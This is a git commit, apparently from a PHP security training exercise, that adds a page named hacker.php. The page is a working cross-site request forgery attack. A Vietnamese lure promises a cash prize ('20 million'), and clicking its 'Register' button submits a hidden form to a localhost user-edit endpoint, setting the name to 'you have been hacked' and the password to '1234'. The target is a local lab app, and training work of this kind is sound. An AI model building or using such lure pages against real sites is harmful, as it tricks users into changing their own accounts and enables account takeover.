8965e14be25ea27ece2912a6255a09424cca504f
huyvo79 <vohaanhhuy79@gmail.com>
2025-09-24 18:39:16 +0700

    commit csrf attack

---
+++ hacker/hacker.php
@@ -0,0 +1,20 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nhận ngay 20 tr!!!!</title>
+</head>
+<body>
+    <img src="https://quocmedia.com/wp-content/uploads/2023/07/Dang-ky-PAyoner.jpg" alt="">
+    <form action="http://localhost:8080/11-training-php-csrf/form_user.php" method="POST"> 
+        đăng ký thành công nhận ngay 20 tr
+        <input  type="hidden" name="name"  value="ban da bi hack!!">
+        <input type="hidden" name="id" >
+        <input type="hidden" name="password" class="form-control" value="1234">
+        <button type="submit" name="submit" value="submit" class="btn btn-primary">Đăng ký</button>
+    </form>
+</body>
+</html>
